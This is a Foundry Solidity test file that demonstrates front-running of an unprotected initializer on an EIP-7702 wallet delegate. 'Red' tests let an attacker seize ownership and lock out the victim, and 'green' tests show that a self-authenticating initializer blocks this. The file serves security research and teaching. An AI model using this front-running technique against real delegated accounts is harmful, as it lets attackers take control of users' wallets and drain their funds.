// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/vulnerable/DC02_UninitDelegate.sol";
import "../src/fixed/DC02_SafeInitDelegate.sol";

/**
 * @title DC02_InitFrontrunTest
 * @notice PoC tests for DC-02: Unprotected / Front-runnable Initializer
 * @author Aditya Chotaliya [adityachotaliya.xyz]
 *
 * Attack scenario:
 *   1. Victim signs EIP-7702 authorization -> delegate = DC02_UninitDelegate
 *   2. Victim broadcasts a bundle: [authorization tx] + [initialize(victim) tx]
 *   3. Attacker's MEV bot sees the pending bundle in the mempool
 *   4. Bot front-runs with: [same authorization tx] + [initialize(attacker)]
 *      (or just calls initialize(attacker) in the same block, before victim)
 *   5. Victim's authorization succeeds, but delegate is now owned by attacker
 *   6. Attacker drains the EOA
 */
contract DC02_InitFrontrunTest is Test {
    address payable public victimEOA;
    address public attacker;

    DC02_UninitDelegate   public vulnDelegate;
    DC02_SafeInitDelegate public safeDelegate;

    function setUp() public {
        victimEOA    = payable(makeAddr("victimEOA"));
        attacker     = makeAddr("attacker");

        vm.deal(victimEOA, 5 ether);

        vulnDelegate = new DC02_UninitDelegate();
        safeDelegate = new DC02_SafeInitDelegate();
    }

    // =========================================================================
    // RED TESTS - front-run attack on vulnerable delegate
    // =========================================================================

    /**
     * @notice RED: Attacker front-runs initialization and becomes the owner
     *
     * The attacker calls initialize() BEFORE the victim does.
     * Because there's no auth check, attacker's address becomes the owner.
     */
    function test_RED_AttackerFrontRunsInit() public {
        console.log("=== DC-02 INIT FRONT-RUN EXPLOIT ===");

        // Victim's authorization is processed (delegation set)
        _etch7702(victimEOA, address(vulnDelegate));

        console.log("Victim's authorization processed. Delegate is set.");
        console.log("Attacker front-runs initialization before victim...");

        // Attacker front-runs: calls initialize with THEIR address
        vm.prank(attacker);
        DC02_UninitDelegate(victimEOA).initialize(attacker);

        address storedOwner = DC02_UninitDelegate(victimEOA).getOwner();
        console.log("Owner after front-run:", storedOwner);
        console.log("Victim address:", victimEOA);
        console.log("Attacker address:", attacker);

        // Attacker is now the owner - victim's own initialize() will revert
        assertEq(storedOwner, attacker, "FRONT-RUN: attacker is now the owner");
        assertTrue(storedOwner != address(victimEOA), "Victim is NOT the owner");
    }

    /**
     * @notice RED: Victim's legitimate initialize() reverts after front-run
     *
     * After the attacker front-runs, the victim's own initialization is blocked.
     * The victim is now locked out of their own delegated EOA.
     */
    function test_RED_VictimLockedOut() public {
        _etch7702(victimEOA, address(vulnDelegate));

        // Attacker front-runs
        vm.prank(attacker);
        DC02_UninitDelegate(victimEOA).initialize(attacker);

        // Victim tries to initialize - REVERTS
        vm.prank(victimEOA);
        vm.expectRevert("already initialized");
        DC02_UninitDelegate(victimEOA).initialize(victimEOA);

        console.log("=== Victim is locked out of their own delegate ===");
        console.log("Owner:", DC02_UninitDelegate(victimEOA).getOwner());
        assertEq(DC02_UninitDelegate(victimEOA).getOwner(), attacker, "Attacker remains owner");
    }

    /**
     * @notice RED: Attacker owns the delegate after front-running
     *
     * Proves that after front-running init, attacker has full owner control.
     */
    function test_RED_AttackerOwnsAfterFrontRun() public {
        _etch7702(victimEOA, address(vulnDelegate));

        // Attacker front-runs and becomes owner
        vm.prank(attacker);
        DC02_UninitDelegate(victimEOA).initialize(attacker);

        // Confirm full ownership
        assertEq(DC02_UninitDelegate(victimEOA).getOwner(), attacker, "Attacker owns the delegate");
        assertTrue(DC02_UninitDelegate(victimEOA).initialized(), "Delegate is initialized (by attacker)");

        // Victim cannot reclaim - any further init is blocked
        vm.prank(victimEOA);
        vm.expectRevert("already initialized");
        DC02_UninitDelegate(victimEOA).initialize(victimEOA);

        console.log("Attacker owns victim EOA delegate - full control achieved");
    }

    // =========================================================================
    // GREEN TESTS - self-authenticating initializer prevents front-run
    // =========================================================================

    /**
     * @notice GREEN: Attacker CANNOT front-run the safe delegate's initializer
     *
     * The safe delegate requires tx.origin == address(this).
     * An attacker cannot satisfy this without the victim's private key.
     */
    function test_GREEN_FrontRunBlockedBySelfAuth() public {
        console.log("=== DC-02 FIXED: Self-Auth Initializer ===");

        _etch7702(victimEOA, address(safeDelegate));

        // Attacker tries to front-run initialize() - should REVERT
        // attacker is both msg.sender and tx.origin, but neither == address(victimEOA)
        vm.startPrank(attacker, attacker);
        vm.expectRevert("DC02: only the EOA can initialize itself");
        DC02_SafeInitDelegate(victimEOA).initialize(attacker);
        vm.stopPrank();

        // Delegate is not initialized - no owner set by attacker
        assertFalse(DC02_SafeInitDelegate(victimEOA).isInitialized(), "Not initialized by attacker");
        assertEq(DC02_SafeInitDelegate(victimEOA).getOwner(), address(0), "No owner set");

        console.log("Attacker's front-run reverted. Delegate owner is still zero.");
    }

    /**
     * @notice GREEN: Only the EOA itself can successfully initialize
     *
     * When tx.origin == address(this) (the EOA calls its own delegate),
     * initialization succeeds.
     */
    function test_GREEN_EOACanInitializeSelf() public {
        _etch7702(victimEOA, address(safeDelegate));

        // Simulate EOA sending its own tx: msg.sender == tx.origin == victimEOA
        // vm.startPrank(msgSender, txOrigin) sets both
        vm.startPrank(victimEOA, victimEOA);
        DC02_SafeInitDelegate(victimEOA).initialize(victimEOA);
        vm.stopPrank();

        assertTrue(DC02_SafeInitDelegate(victimEOA).isInitialized(), "Should be initialized");
        assertEq(DC02_SafeInitDelegate(victimEOA).getOwner(), victimEOA, "EOA is the owner");

        console.log("=== EOA successfully initialized its own delegate ===");
        console.log("Owner:", DC02_SafeInitDelegate(victimEOA).getOwner());
    }

    // =========================================================================
    // Helpers
    // =========================================================================

    function _etch7702(address eoa, address delegate) internal {
        vm.etch(eoa, delegate.code);
    }
}
